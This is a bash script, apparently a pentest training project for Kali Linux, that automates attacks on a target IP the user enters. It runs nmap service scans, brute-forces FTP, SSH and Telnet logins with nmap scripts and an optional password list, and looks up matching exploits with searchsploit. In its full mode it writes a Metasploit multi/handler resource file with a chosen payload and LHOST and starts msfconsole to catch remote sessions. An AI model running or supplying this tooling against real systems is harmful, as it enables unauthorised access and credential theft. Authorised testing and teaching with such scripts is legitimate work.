#!/bin/bash

# Color codes for better readability
RED='\033[0;31m'    # Red color for text
GRN='\033[0;32m'    # Green color for text
YLW='\033[0;33m'    # Yellow color for text
BGRN='\033[1;32m'   # Bright Green color for text
BCYN='\033[1;36m'   # Bright Cyan color for text
CLR='\033[0m'       # Reset color (used to reset the color formatting)

# Function to handle creation and ownership of files
create_and_chown() {
    local file="$1"  # Define the file name parameter
    sudo touch "$file"  # Create an empty file with sudo privileges
    sudo chown kali:kali "$file"  # Change the ownership of the file to user 'kali' and group 'kali'
    echo -e "${GRN}File '$file' created successfully.${CLR}"  # Print success message in green color
}

# Function to run Nmap vulnerability scan for a given port/service
run_vulnerability_scan() {
    local service="$1"  # Define the service name (e.g., SSH, FTP)
    local scan_script="$2"  # Define the Nmap script to run for the scan
    local output_file="$3"  # Define the output file for scan results
    local ip="$4"  # Define the target IP address to scan
    local pwl_path="$5"  # Define the path to the password list (if any)
    local ans="$6"  # Define user input for password list usage (yes/no)
    
    echo -e "${BCYN}Open $service port found! Running $service vulnerability assessment...${CLR}"  # Inform user that the vulnerability assessment is starting
    
    # Check if the user wants to use a password list
    if [ "$ans" == "yes" ]; then
        sudo nmap "$ip" --script "$scan_script" --script-args passdb="$pwl_path" -T3 >> "$output_file"  # Run Nmap with the password list
        echo "Running searchsploit against $service"  # Inform user that searchsploit is running
        searchsploit "$service" >> "$output_file"  # Run searchsploit to find exploits for the service and save output
    else
        sudo nmap "$ip" --script "$scan_script" -T3 >> "$output_file"  # Run Nmap without password list
        echo "Running searchsploit against $service"  # Inform user that searchsploit is running
        searchsploit "$service" >> "$output_file"  # Run searchsploit and save output
    fi
    echo -e "${BCYN}$service vulnerability findings updated in $output_file${CLR}"  # Inform user that the findings are saved
}

# Function to handle the scan process for each service
process_service_scan() {
    local ip="$1"  # Define the target IP address
    local service="$2"  # Define the service name (e.g., FTP, SSH)
    local output_file="$3"  # Define the output file to store results
    local pwl_path="$4"  # Define the password list path (if used)
    local ans="$5"  # Define user's answer on using password list

    case "$service" in
        "ftp")  # If the service is FTP
            run_vulnerability_scan "FTP" "ftp-brute" "$output_file" "$ip" "$pwl_path" "$ans"  # Run FTP vulnerability scan
            ;;
        "ssh")  # If the service is SSH
            run_vulnerability_scan "SSH" "ssh-brute" "$output_file" "$ip" "$pwl_path" "$ans"  # Run SSH vulnerability scan
            ;;
        "telnet")  # If the service is Telnet
            run_vulnerability_scan "TELNET" "telnet-brute" "$output_file" "$ip" "$pwl_path" "$ans"  # Run Telnet vulnerability scan
            ;;
        "ms-wbt-server")  # If the service is RDP (Remote Desktop)
            echo -e "${BCYN}Discovered open RDP port! Running RDP vulnerability scanning...${CLR}"  # Inform user about open RDP port
            sudo nmap "$ip" --script "rdp*" -T3 >> "$output_file"  # Run Nmap vulnerability scan for RDP
            echo "Running searchsploit against RDP"  # Inform user that searchsploit is running
            sudo searchsploit "microsoft remote desktop" >> "$output_file"  # Run searchsploit for RDP and save output
            echo -e "${BCYN}RDP vulnerability findings updated in $output_file${CLR}"  # Inform user that RDP findings are saved
            ;;
    esac
}

# Script starts here
echo -e "${BGRN}Greetings, User.${CLR}"  # Display greeting in bright green

# Prompt for directory name and create directory
echo -e "Please enter the name of the directory you want to create:"  # Ask user for directory name
read DIRNAME  # Read user input for directory name
DIR_PATH="$(pwd)/$DIRNAME"  # Define the full path of the directory
if [ -d "$DIR_PATH" ]; then  # Check if the directory already exists
    echo -e "${RED}Directory '$DIRNAME' already exists.${CLR}"  # If exists, show error message
else
    mkdir "$DIR_PATH"  # If doesn't exist, create the directory
    echo -e "${GRN}Directory '$DIRNAME' created successfully.${CLR}"  # Show success message in green
fi

# Define output files
output_file="$DIR_PATH/basic.txt"  # Define output file for basic scan
output_file2="$DIR_PATH/full.txt"  # Define output file for full scan
create_and_chown "$output_file"  # Create the basic output file and set ownership
create_and_chown "$output_file2"  # Create the full output file and set ownership

# Prompt for target IP/Domain and scan type
echo -e "Please provide ${RED}TARGET${CLR} IP/Domain to scan"  # Ask for target IP or domain
read IP  # Read user input for target IP or domain
echo -e "Please select type of port scanning - Enter either ${YLW}basic${CLR} or ${YLW}full${CLR}"  # Ask for scan type (basic or full)
read SCANTYPE  # Read user input for scan type

# Ask if user wants to use password list
echo -e "Do you want to use a word password list? ${YLW}yes/no${CLR}"  # Ask if user wants to use a password list
read ANS  # Read user input (yes/no)
if [ "$ANS" == "yes" ]; then  # If user wants to use a password list
    echo -e "Please enter the full path of your password list below:"  # Prompt for password list path
    read PWLPATH  # Read password list path
fi

# Run the scan based on selected type
if [ "$SCANTYPE" == "basic" ]; then  # If 'basic' scan is selected
    echo -e "${BGRN}(BASIC) selected - Scanning for TCP/UDP ports service version and weak password scans${CLR}"  # Inform user about the scan type
    sudo nmap -sV -sS -sU -Pn -n "$IP" -p 21 -v -T3 > "$output_file"  # In the interest of time. I had only ran basic scan for FTP (port 21). Please feel free to run full 65535 ports scan and top 1000 port scans.

    read_file=$(cat "$output_file" | grep open)  # Read the output file and filter for open ports
    for line in $read_file; do  # Loop through each open port
        process_service_scan "$IP" "$line" "$output_file" "$PWLPATH" "$ANS"  # Process each service found
    done

elif [ "$SCANTYPE" == "full" ]; then  # If 'full' scan is selected
    echo -e "${BGRN}(FULL) selected - Scanning TCP/UDP ports service version and weak password scans & vulnerability analysis${CLR}"  # Inform user about the full scan
    sudo nmap -sV -sS -sU -Pn -n "$IP" -p 21,22,23 -v -T3 > "$output_file2"  # In the interst of time, I had only ran basic scan for FTP, SSH & TELENT ports. Please feel free to run full 65535 ports scan and top 1000 port scans.

    read_file=$(cat "$output_file2" | grep open)  # Read the output file and filter for open ports
    for line in $read_file; do  # Loop through each open port
        process_service_scan "$IP" "$line" "$output_file2" "$PWLPATH" "$ANS"  # Process each service found
    done

    # Ask user whether they wish to run msfconsole
    echo -e "Do you wish to proceed and run msfconsole with a payload for further exploitation? ${YLW}yes/no${CLR}"  # Ask user about running msfconsole
    read METAYN  # Read user input (yes/no)
    if [ "$METAYN" == "yes" ]; then  # If user wants to proceed with msfconsole
        echo -e "${BCYN}Running necessary steps for msfconsole${CLR}"  # Inform user that msfconsole setup is starting
        touch meterpreter.rc  # Create meterpreter script
        echo use exploit/multi/handler >> meterpreter.rc  # Set up msfconsole handler
        echo -e "Enter full path of PAYLOAD"  # Ask for payload path
        read PAYLD  # Read payload path
        echo set PAYLOAD "$PAYLD" >> meterpreter.rc  # Set the payload in the script
        echo -e "Enter LHOST"  # Ask for LHOST (attacker machine IP)
        read IPADD  # Read LHOST IP address
        echo set LHOST "$IPADD" >> meterpreter.rc  # Set LHOST in the script
        echo set ExitOnSession false >> meterpreter.rc  # Prevent exit on session end
        echo exploit -j -z >> meterpreter.rc  # Add exploit command to the script
        msfconsole -r meterpreter.rc  # Launch msfconsole with the provided script
    else
        echo "Not proceeding to run msfconsole"  # If user doesn't want to proceed
    fi

else  # If an invalid scan type is selected
    echo -e "${RED}Invalid selection! Please enter either 'basic' or 'full'${CLR}"  # Show error message for invalid input
fi

# Ask user if they want to zip the folder
echo -e "Do you want to zip the file? ${YLW}yes/no${CLR}"  # Ask if user wants to zip the folder
read ZIPF  # Read user input (yes/no)
if [ "$ZIPF" == "yes" ]; then  # If user wants to zip the folder
    zip -r vuln_result.zip "$DIR_PATH"  # Zip the directory with results
    echo "${GRN} $DIR_PATH and embedded files zipped under Filename: vuln_result.zip${CLR}"  # Inform user about the zipped file
elif [ "$ZIPF" == "no" ]; then  # If user doesn't want to zip the folder
    echo -e "${GRN}File zipping is not required. KThxBye!!${CLR}"  # Show message and end script
else  # If user provides an invalid response
    echo -e "${RED}Invalid response. Please enter 'yes' or 'no'.${CLR}"  # Show error message for invalid input
fi
